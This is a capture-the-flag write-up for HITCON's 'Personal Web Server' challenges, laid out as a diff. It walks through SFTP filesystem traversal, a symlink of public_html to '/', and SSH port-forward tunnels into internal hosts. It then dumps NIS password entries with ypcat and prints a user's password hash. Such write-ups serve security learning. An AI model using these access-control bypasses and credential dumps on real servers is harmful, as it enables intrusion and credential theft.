@@ -1,0 +1,93 @@
+The Personal Web Server and Personal Web Server 2 share infrastructure.
+
+The challenge begins with at 
+http://www.pws.chal.hitconctf.com/
+
+This page includes the following instructions:
+
+Use FTP to connect to the login node. We have deprecated the insecure plaintext FTP.
+Use SFTP (SSH File Transfer Protocol) to connect to login node.
+Hostname: file.pws.chal.hitconctf.com
+Port: 10022
+Once connected, create the public_html directory within your home directory. This is where you'll upload your web files.
+
+Connecting with sftp we find that we can following the given instructions and create a public_html directory.
+Its contents can be viewed at:
+http://www.pws.chal.hitconctf.com/~$username/
+
+At this point we can try upload various .htaccess files to try and enable SSI and various executions.
+It is possible to enable server-status, as well as enumerate loaded modules, but execution of code does not seem possible.
+
+Via sftp, we find that we can traverse the entire filesystem of the host outside out homedir, and download files.
+
+Noticeably, we are not able to find any sign of the http service configuration files in the /etc file system.
+
+However, We can now review the sshd config file and confirm that this is missing security directives including:
+ChrootDirectory
+PermitTunnel no
+
+See: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh
+
+We also note that we can make symlinks.
+
+To find the first flag, we need to realize that the httpd server process must be able to read its own files and configuration.
+Taking advantage of these, we delete our public_html directory, and replace it with a symlink to '/'.
+sftp> symlink / public_html
+
+We can now traverse the filesystem as the www-data user, via:
+http://www.pws.chal.hitconctf.com/~$username/
+
+This use can see additional files and directories, including /app and the http and nginx configurations.
+
+Reviewing these we find in:
+/etc/apache2/sites-enabled/000-default.conf
+
+Reference to a /flag.txt at a url 'internal'.
+
+The config file seems to block access to this url. 
+However we can bypass with ssh using tunneling through the sftp service.
+
+sudo ssh -L 80:internal:80 -N -f username@file.pws.chal.hitconctf.com -p 10022
+
+and not we can run
+wget localhost/flag.txt
+
+to get the flag.
+
+For the second flag we need the password hash for a user "flagholder"
+
+We find that the server is setup to authenticate via yp protocol to a nis server.
+And in /etc/yp.conf we find:
+ypserver node10
+
+From our /etc/host file we note that:
+172.26.0.20     node20.hitcon node20
+
+So, using our ssh tunnels we can connect to node10 via portmapper to find the ypserv service.
+
+❯ sudo ssh -L 111:172.26.0.10:111 -N -f username@file.pws.chal.hitconctf.com -p 10022
+❯ rpcinfo -p localhost
+   program vers proto   port  service
+    100000    4   tcp    111  portmapper
+    100000    3   tcp    111  portmapper
+    100000    2   tcp    111  portmapper
+    100000    4   udp    111  portmapper
+    100000    3   udp    111  portmapper
+    100000    2   udp    111  portmapper
+    100004    2   udp    630  ypserv
+    100004    1   udp    630  ypserv
+    100004    2   tcp    630  ypserv
+    100004    1   tcp    630  ypserv
+
+To access the ypserv service on node10 we can again use our tunneling abilities.
+> sudo ssh -L 630:172.26.0.10:630 -N -f user168@file.pws.chal.hitconctf.com -p 10022
+
+and then after installing yp-tools
+> sudo apt install yp-tools
+
+we can dump the nis shadowed passwords
+> ypcat -d hitcon -h localhost passwd.byname
+
+and we find:
+
+flagholder:!$y$j9T$LNmGE79e0l4Rj6bKhTosA1$rP24Qc3XWuTvNKKn0fes4WWjbcptfskAaRQInBbKIO2:1500:1500::/home/flagholder:/usr/sbin/nologin
